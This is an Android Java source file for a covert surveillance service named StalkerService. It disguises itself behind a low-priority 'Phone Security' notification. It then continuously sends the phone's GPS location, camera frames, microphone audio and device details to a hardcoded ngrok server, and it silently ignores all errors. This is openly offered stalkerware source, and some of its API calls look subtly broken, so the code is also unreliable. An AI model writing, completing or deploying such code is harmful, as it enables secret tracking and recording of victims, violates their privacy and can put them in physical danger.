package com.stalker;
import android.app.*;
import android.content.*;
import android.graphics.*;
import android.hardware.camera2.*;
import android.location.*;
import android.media.*;
import android.os.*;
import android.util.Base64;
import java.net.*;
import java.io.OutputStream;
import java.util.concurrent.Executors;
public class StalkerService extends Service {
private String url;private java.util.concurrent.ScheduledExecutorService ex;private volatile boolean run=true;
@Override public void onCreate(){super.onCreate();
NotificationManager nm=(NotificationManager)getSystemService(NOTIFICATION_SERVICE);
nm.createNotificationChannel(new NotificationChannel("s","Sec",NotificationManager.IMPORTANCE_MIN));
startForeground(1,new Notification.Builder(this,"s").setContentTitle("Phone Security").setContentText("Active").setSmallIcon(android.R.drawable.sym_def_app_icon).setOngoing(true).build());}
@Override public int onStartCommand(Intent i,int f,int id){
url=i!=null?i.getStringExtra("url"):"https://setting-crestless-derail.ngrok-free.dev";
ex=Executors.newScheduledThreadPool(3);
loc();cam();aud();info();return START_STICKY;}
private void loc(){LocationManager lm=(LocationManager)getSystemService(LOCATION_SERVICE);
try{lm.requestLocationUpdates(LocationManager.GPS_PROVIDER,5000,10f,new LocationListener(){
public void onLocationChanged(Location l){ex.submit(()->post("location","{\"lat\":"+l.getLatitude()+",\"lon\":"+l.getLongitude()+"}"));}
public void onStatusChanged(String a,int b,android.os.Bundle c){}
public void onProviderEnabled(String a){}
public void onProviderDisabled(String a){}});}catch(Exception e){}}
private void cam(){ex.submit(()->{try{
CameraManager cm=(CameraManager)getSystemService(CAMERA_SERVICE);
String cid=cm.getCameraIdList()[0];
ImageReader ir=ImageReader.newInstance(640,480,PixelFormat.JPEG,2);
ir.setOnImageAvailableHandler(r->{ImageReader.Image im=r.acquireLatestImage();if(im==null)return;
byte[] px=new byte[im.getPlanes()[0].getBuffer().remaining()];im.getPlanes()[0].getBuffer().get(px);im.close();
ex.submit(()->post("camera","{\"img\":\""+Base64.encodeToString(px,Base64.NO_WRAP)+"\"}"));});
cm.openCamera(cid,new CameraDevice.StateCallback(){
public void onOpened(CameraDevice c){try{c.createCaptureSession(java.util.Arrays.asList(ir.getSurface()),
s->{try{CaptureRequest.Builder b=c.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);b.addTarget(ir.getSurface());s.setRepeatingRequest(b.build(),null,ex);}catch(Exception e){}},ex);}catch(Exception e){}},ex);
public void onDisconnected(CameraDevice c){c.close();}
public void onError(CameraDevice c,int e){c.close();}},ex);
}catch(Exception e){}});}
private void aud(){ex.submit(()->{
int bs=AudioRecord.getMinBufferSize(44100,AudioFormat.CHANNEL_IN_MONO,AudioFormat.ENCODING_PCM_16BIT);
if(bs<=0)return;byte[] buf=new byte[bs];
try{AudioRecord ar=new AudioRecord(MediaRecorder.AudioSource.MIC,44100,AudioFormat.CHANNEL_IN_MONO,AudioFormat.ENCODING_PCM_16BIT,bs*2);
ar.startRecording();
while(run){int rd=ar.read(buf,0,buf.length);if(rd>0){byte[] ck=new byte[rd];System.arraycopy(buf,0,ck,0,rd);
ex.submit(()->post("audio","{\"a\":\""+Base64.encodeToString(ck,Base64.NO_WRAP)+"\"}"));}
try{Thread.sleep(10000);}catch(Exception e){break;}}}catch(Exception e){}});}
private void info(){ex.submit(()->post("device","{\"m\":\""+android.os.Build.MODEL+"\",\"o\":\""+android.os.Build.VERSION.RELEASE+"\"}"));}
private void post(String t,String j){try{HttpURLConnection c=(HttpURLConnection)new URL(url+"/"+t).openConnection();
c.setRequestMethod("POST");c.setRequestProperty("Content-Type","application/json");c.setDoOutput(true);
try(OutputStream os=c.getOutputStream()){os.write(j.getBytes());}c.getResponseCode();}catch(Exception e){}}
@Override public void onDestroy(){run=false;if(ex!=null)ex.shutdownNow();super.onDestroy();}
@Override public IBinder onBind(Intent i){return null;}}
